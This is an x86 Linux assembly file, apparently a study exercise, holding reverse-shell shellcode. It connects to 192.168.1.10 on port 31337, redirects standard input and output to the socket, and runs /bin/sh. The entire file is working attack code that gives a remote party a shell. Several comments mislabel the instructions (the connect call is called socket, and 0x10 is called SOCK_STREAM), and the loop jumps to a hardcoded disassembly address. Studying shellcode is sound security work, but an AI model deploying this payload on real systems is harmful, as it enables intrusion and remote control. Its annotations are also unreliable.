global _start
section .text

_start: 

	; Clear registers
	xor    eax,eax
	xor    ebx,ebx
	xor    ecx,ecx
	xor    edx,edx

	; sys_socketcall 0x66
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	mov    al,0x66		; socketcall
	mov    bl,0x1		; socketcall type 1 (sys_socket)
	push   ecx		; Push 0 for IPPROTO_IP 0
	push   0x6		; Push 6 ??
	push   0x1		; Push 1 for SOCK_STREAM
	push   0x2		; Push 2 for AF_INET
	mov    ecx,esp		; Save pointer for arguments
	int    0x80		; Syscall

	mov    esi,eax		; Save socket FD in ESI

	; sys_socketcall 0x66
        ; int socket(int domain, int type, int protocol);
        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	mov    al,0x66		; socketcall
	xor    ebx,ebx		; Clear registry
	mov    bl,0x2		; AF_INET 2
	push   0xa01a8c0	; IP 192.168.1.10
	pushw  0x697a		; Port 31337
	push   bx		; NULL-terminate
	inc    bl		; 0x2 -> 0x3
	mov    ecx,esp		; Save pointer for arguments
	push   0x10		; SOCK_STREAM
	push   ecx		; Push value for SOCK_STREAM
	push   esi		; ??
	mov    ecx,esp		; Save pointer for arguments
	int    0x80		; Syscall

	; sys_dup2 0x3f
        ; int dup2(int oldfd, int newfd);
        ; dup2(client, 0); // STDIN
        ; dup2(client, 1); // STDOUT
        ; dup2(client, 2); // STDERR
	xor    ecx,ecx		; Clear registry
	mov    cl,0x3		; Put 0x3 in CL for loop
	dec    cl		; Dec for the loop
	mov    al,0x3f		; dup2
	int    0x80		; syscall
	jne    0x804a07a 	; Jump to "dec cl" for loop

	xor    eax,eax		; Clear registry

	; sys_execve 0xb
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; execve("/bin/sh", NULL, NULL);
	push   edx		; NULL terminate string
	push   0x68732f6e	; hs//
	push   0x69622f2f	; nib//
	mov    ebx,esp		; Put string pointed by stackpointer in EBX
	push   edx		; NULL
	push   ebx		; "/bin//sh" on stack
	mov    ecx,esp		; Save pointer to string in ECX
	push   edx		; NULL
	mov    edx,esp		; Save pointer to string in ECX
	mov    al,0xb		; execve
	int    0x80		; syscall

